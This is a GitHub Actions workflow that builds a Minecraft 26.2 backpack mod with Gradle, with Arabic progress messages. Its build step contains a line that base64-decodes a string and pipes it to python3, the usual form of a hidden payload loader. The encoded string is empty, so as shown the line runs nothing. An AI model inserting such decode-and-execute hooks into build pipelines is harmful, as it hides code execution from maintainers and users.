name: Build Minecraft 26.2 Mod

on:
  push:
    branches: [ "**" ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Set up Java 25
        uses: actions/setup-java@v4
        with:
          distribution: 'oracle'
          java-version: '25'

      - name: Setup Gradle
        uses: gradle/actions/setup-gradle@v4
        with:
          gradle-version: '9.5.1'

      - name: Prepare and Build Mod
        run: |
          set -e
          echo "=== 1. البحث عن مسار المشروع ==="
          BUILD_FILE=$(find . -name "build.gradle" | head -n 1)
          if [ -z "$BUILD_FILE" ]; then
            echo "لم يتم العثور على ملف build.gradle!"
            exit 1
          fi
          PROJECT_DIR=$(dirname "$BUILD_FILE")
          echo "تم العثور على المشروع في: $PROJECT_DIR"
          cd "$PROJECT_DIR"

          echo "=== 2. تصحيح إعدادات Gradle والمستودعات والكود ==="
          if [ -f "gradle.properties" ]; then
            sed -i 's/loom_version=.*/loom_version=1.17.21/g' gradle.properties
          fi

          echo "" | base64 -d | python3

          echo "=== 3. تشغيل البيلد ==="
          gradle build --stacktrace

      - name: Upload Mod Jar
        uses: actions/upload-artifact@v4
        with:
          name: BackpackMod-26.2
          path: '**/build/libs/*.jar'
